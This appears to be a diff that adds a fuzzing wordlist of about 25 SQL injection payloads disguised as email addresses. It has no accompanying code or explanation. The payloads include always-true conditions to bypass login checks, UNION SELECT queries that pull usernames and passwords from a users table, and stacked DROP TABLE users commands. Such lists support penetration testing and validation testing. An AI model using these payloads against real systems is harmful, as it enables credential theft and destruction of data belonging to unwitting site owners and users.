@@ -1,0 +1,25 @@
+test' OR '1'='1' --@example.com
+test' OR '1'='1' /*@example.com
+test' OR 1=1; DROP TABLE users; --@example.com
+test' UNION SELECT username, password FROM users; --@example.com
+test' UNION SELECT column1, column2 FROM table2; --@example.com
+' OR 1=1; DROP TABLE users; --@example.com
+' UNION SELECT username, password FROM users; --@example.com
+' UNION SELECT column1, column2 FROM table2; --@example.com
+test' AND '1'='0' --@example.com
+test' AND '1'='1' --@example.com
+test' AND '1'='0' /*@example.com
+test' AND '1'='1' /*@example.com
+test' OR 'x'='x' --@example.com
+test' OR 'x'='y' --@example.com
+test@example.com' OR '1'='1' --'
+test@example.com' OR '1'='1' /*'
+test@example.com' OR 1=1; DROP TABLE users; --'
+test@example.com' UNION SELECT username, password FROM users; --'
+test@example.com' UNION SELECT column1, column2 FROM table2; --'
+test@example.com' OR 'x'='x' --'
+test@example.com' OR 'x'='y' --'
+test@example.com' OR '1'='1' --/*
+test@example.com' OR 1=1; DROP TABLE users; --'
+test@example.com' UNION SELECT username, password FROM users; --'
+test'+or+1%3d1+limit+15--+-%40test.com
